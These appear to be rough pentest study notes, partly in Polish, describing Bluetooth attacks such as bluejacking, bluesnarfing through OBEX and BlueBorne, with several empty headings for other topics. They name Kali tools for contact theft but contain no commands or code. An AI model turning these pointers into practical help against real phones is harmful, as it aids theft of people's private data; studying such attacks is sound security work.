<p><strong>Bluejacking</strong> involves sending unsolicited messages over Bluetooth to other Bluetooth‑enabled devices. It’s essentially a form of spam. It requires a target device to have Bluetooth enabled and to be discoverable. No harm in so far as the attacker gains no control over the device and can’t access any sensitive information, but it’s considered an attack against integrity because it abuses the trust relationship between the two devices. programy: BlueSpam, Freejack and eJack
<strong>Bluesnarfing</strong> is the theft of information from Bluetooth‑enabled devices. It relies on exploiting a vulnerability in the object exchange, or OBEX, protocol. OBEX enables the exchange of data between connected devices, but most of its subservices don’t require any authentication to validate the device sending or receiving the data. The original developers of Bluetooth technology consciously implemented the OBEX protocol without authentication policies in place like asking for a PIN or a paring request in order to ease the sharing of digital business cards. Kali includes the <strong>Bluesnarfer</strong> package, which allows phonebook contact theft via Bluetooth given a device ID or address, and <strong>Bluediving</strong>, which implements several attacks, including BlueBug, BlueSnarf, BlueSnarf++, and BlueSmack. Unless the hacker has specialized equipment, they must be within 30 ft or 10 m of the victim’s phone for the attack to succeed. Bluesniping is a type of Bluesnarfing in which the hacker uses equipment to increase the range of the paired phone, allowing it to attack devices that are located farther away than the standard Bluetooth range.
inne ataki: <strong>Bluebugging</strong>, <strong>CarWhispere</strong> (podatność w sytemach bt aut), <strong>BlueBorne</strong> (ifect with malware),</p>
<h3 id="rfid-cloning">RFID Cloning</h3>
<h2 id="application-attacks">Application attacks</h2>
<h3 id="server-side-request-forgery">Server-side Request Forgery</h3>
<h2 id="attacks-against-cloud-technologies">Attacks against cloud technologies</h2>
<h2 id="attacking-and-exploiting-specialized-systems">Attacking and exploiting specialized systems</h2>
<h2 id="social-engineering-and-physical-attacks">Social engineering and physical attacks</h2>
<h2 id="post-exploitation">Post-exploitation</h2>
<h1 id="5-post-exploitation">5. Post Exploitation</h1>
<h1 id="6-reporting">6. Reporting</h1>
</div>
      </article>
    </div>
  </body>
</html>
